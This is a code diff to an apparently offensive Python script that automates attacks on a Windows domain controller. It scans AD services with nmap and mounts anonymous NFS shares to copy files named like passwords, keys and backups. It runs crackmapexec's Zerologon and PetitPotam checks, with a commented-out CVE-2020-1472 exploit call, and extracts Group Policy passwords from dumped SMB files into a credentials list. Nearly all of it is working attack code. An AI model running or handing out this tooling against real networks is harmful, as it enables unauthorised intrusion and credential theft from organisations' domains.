@@ -163,7 +163,7 @@ if internal:
 
 	os.system('cat nmap_disco_iface.txt | grep "Server Identifier" | cut -d ":" -f2 > nmap_dhcp_discover.txt')
 	os.system('cat nmap_disco_iface.txt | grep Domain | cut -d ":" -f2 >> nmap_dhcp_discover.txt')
-	os.system("rm nmap_disco_iface.txt")
+	#os.system("rm nmap_disco_iface.txt")
 
 	with open("nmap_dhcp_discover.txt","r") as fichier:
 		contenu=fichier.readlines()
@@ -257,10 +257,12 @@ ip_to_scan = contenu[0].replace("\n","")
 ip_to_scan=re.findall(reg,ip_to_scan)[0]
 
 
-printf(f" scanning the Domain Controller {ip_to_scan}", green)
+printf(f" scanning {ip_to_scan}", green)
 
 os.system(f'nmap {ip_to_scan} -p 22,139,389,445,2049,3268,3389,5985 -Pn | grep open > nmap_scan.txt; nmap {ip_to_scan} -p 3389 -sC -Pn >> nmap_scan.txt')
 os.system(f'cat nmap_scan.txt | grep DNS_Domain_Name | cut -d ":" -f2 >> DC.txt')
+os.system("cat nmap_scan.txt | grep DNS_Computer_Name | awk '{print $3}' > CN.txt")
+
 
 with open('DC.txt', 'r') as fichier:
 	contenu = fichier.readlines()
@@ -277,8 +279,13 @@ else:
 	Domain_Name = Domain_Name.replace(" ","")
 	krb=1
 
+with open("CN.txt","r") as f:
+	CN=f.read()
+	CN=CN.replace("\n","")
+
+
 print("")
-printf(' '+green+f'DC {ip_to_scan} {Domain_Name}'+white,green )
+printf(' '+green+f'DC {ip_to_scan} {CN}'+white,green )
 printf(' NTP synchronizing with the DC for Kerberos',green)
 cmd=f'libs/ntp_sync.sh {ip_to_scan}'
 subprocess.call(cmd,shell=True)
@@ -295,7 +302,7 @@ else:
 
 with open("nmap_scan.txt","r") as fichier2:
 		contenu_nmap=fichier2.readlines()
-os.system("rm nmap_scan.txt")
+#os.system("rm nmap_scan.txt")
 ssh=0
 smb=0
 winrm = 0
@@ -383,7 +390,7 @@ if smb==1:
 			print()
 
 		if os.path.isdir("smb_dump"):
-			printf(" could be interesting in /smb_dump",green)
+			printf(" could be interesting in ./smb_dump",green)
 			for filename in os.listdir("./smb_dump"):
 				print(yellow+filename+white)
 			print()
@@ -407,6 +414,7 @@ else:
 
 
 if nfs:
+	file_content="account,compte,cred,user,pass,util,backup,note,vbs,ps1,bat,code,conf,cfg,rsa,pem,key,xml,xslx,doc,id,txt,zip".split(",")
 	printf(" scanning NFS",green)
 	r=random.randrange(1000000)
 	os.system(f"showmount -e {ip_to_scan} > NFS.txt")
@@ -416,19 +424,38 @@ if nfs:
 	with open("NFS_shares.txt","r") as f:
 		anon_shares=f.readlines()
 
+
 	for anon_share in anon_shares:
 		anon_share=anon_share.replace("\n","")
-		printf(f" try to mount {ip_to_scan}://{anon_share} and dumping juicy files in /NFS",green)
+		printf(f" try to mount {ip_to_scan}://{anon_share} /tmp/nfs_temp_{r} and dumping juicy files in ./NFS",green)
 		try:
 			os.system(f"mount -t nfs {ip_to_scan}:/{anon_share} /tmp/nfs_temp_{r}")
 		except:
+			printf(" Mount error",red)
 			pass
-		try:
-			os.system(f"cp /tmp/nfs_temp_{r}/* ./NFS")
-		except:
-			pass
+		printf(" scan recursively, could take a while...",green)
+		os.system(f"tree /tmp/nfs_temp_{r} -fain > tree.txt")
+		#os.system(f"tree /tmp/nfs_temp_{r} -fain")
+
+		with open("tree.txt","r") as z:
+			tree=z.readlines()
+		printf(" Dumping files, could take a while...",green)
+		# on check les droits de lecture
+		for file in tree:
+			file=file.replace("\n","")
+			#print(file)
+			if os.path.isfile(file):
+				#printf(file,green)
+				
+				for k in file_content:
+					if k in file:
+						#print("copy the file")
+						os.system(f"cp {file} ./NFS 2>/dev/null")
+
+		os.system(f"umount {ip_to_scan}:/{anon_share}")
+
 		if os.listdir("./NFS"):
-			printf(" could be interesting in /NFS",green)
+			printf(" could be interesting in ./NFS",green)
 			os.chdir("./NFS")
 
 			# bug quand folders
@@ -547,14 +574,16 @@ if ldap:
 	if len(contenu) !=0:
 		dumpLdapDB(contenu, ip_to_scan, Domain_Name)
 if smb:
-	printf(" scanning Zerologon vuln",green)
-	os.system(f"crackmapexec smb {ip_to_scan} -u 'guest' -p '' -M zerologon")
+	printf(" scanning Zerologon vuln 	(about 2mn)",green)
+	#print(CN.split('.')[0])
+	#os.system(f"python cve-2020-1472-exploit.py {CN.split('.')[0]} {ip_to_scan}")
+	os.system(f"crackmapexec smb {ip_to_scan} -u '' -p '' -d {Domain_Name} -M zerologon")
 	printf(" scanning Petitpotam vuln",green)
 	os.system(f"crackmapexec smb {ip_to_scan} -u '' -p '' -M petitpotam")
 
 if len(contenu) !=0:
 	print()
-	printf(" scanning SMB shares for passwords, DRSUAPI, remote access: --> /smb_dump", green)
+	printf(" scanning SMB shares for passwords, DRSUAPI, remote access: --> ./smb_dump", green)
 	print("")
 	for cred in contenu:
 		user=cred.split(":")[0]
@@ -600,7 +629,7 @@ if len(contenu) !=0:
 
 			os.chdir("../")
 			if os.listdir("./smb_dump"):
-				printf(" Could be interesting in /smb_dump",green)
+				printf(" Could be interesting in ./smb_dump",green)
 				for filename in os.listdir("./smb_dump"):
 					print(yellow+filename+white)
 				print()
@@ -631,40 +660,41 @@ if len(contenu) !=0:
 
 if os.path.isdir("./smb_dump"):
 	os.chdir("./smb_dump")
+	xml_flag=0
 	for filename in os.listdir("./"):
+		#print(filename)
 		if ".xml" in filename:
 			xml_flag=1
-		else:
-			xml_flag=0
-		if xml_flag==1:		
-			printf(" parsing .xml files for GPP passwords",green)
-			for filename in os.listdir("./"):
-				if ".xml" in filename:
-					print(filename)
-					os.system(f"python {path_impacket}/Get-GPPPassword.py -xmlfile '{filename}' 'LOCAL' " + " | grep 'Username\\|Password' | awk '{print $4}' 2>/dev/null 1>xml_cred.txt")
-					with open("xml_cred.txt","r") as fichier:
-						contenu=fichier.readlines()
-					os.system("rm xml_cred.txt")
-					if len(contenu)==2:
-						u=contenu[0].replace("\n","")
-						p=contenu[1].replace("\n","")
-						cred=u+":"+p
-						if cred !=":":
-							printf(f" Found in smb_dump/{filename}:",green)
-							print(yellow+cred+white+"	\t(Added to all_creds.txt)")
+			#printf(" youpi",green)
+			
+	if xml_flag==1:		
+		printf(" parsing .xml files for GPP passwords",green)
+		for filename in os.listdir("./"):
+			if ".xml" in filename:
+				print(filename+" "*40,end='\r')
+				os.system(f"python {path_impacket}/Get-GPPPassword.py -xmlfile '{filename}' 'LOCAL' " + " | grep 'Username\\|Password' | awk '{print $4}' 2>/dev/null 1>xml_cred.txt")
+				with open("xml_cred.txt","r") as fichier:
+					contenu=fichier.readlines()
+				os.system("rm xml_cred.txt")
+				if len(contenu)==2:
+					u=contenu[0].replace("\n","")
+					p=contenu[1].replace("\n","")
+					cred=u+":"+p
+					if cred !=":":
+						printf(f" Found in ./smb_dump/{filename}:",green)
+						print(yellow+cred+white+"	\t(Added to all_creds.txt)")
 
-							#os.chdir("../")
-							with open("../all_creds.txt","r") as fichier2:
-								contenu_all_creds=fichier2.readlines()
-							if (cred+"\n") not in contenu_all_creds:	
-								os.system(f"echo '{cred}' >> ../all_creds.txt")
+						#os.chdir("../")
+						with open("../all_creds.txt","r") as fichier2:
+							contenu_all_creds=fichier2.readlines()
+						if (cred+"\n") not in contenu_all_creds:	
+							os.system(f"echo '{cred}' >> ../all_creds.txt")
 	
 	os.chdir("../")
 
 
 
 print()
-os.system("pwd")
 with open("all_creds.txt","r") as fichier:
 	contenu=fichier.read()
 if contenu:
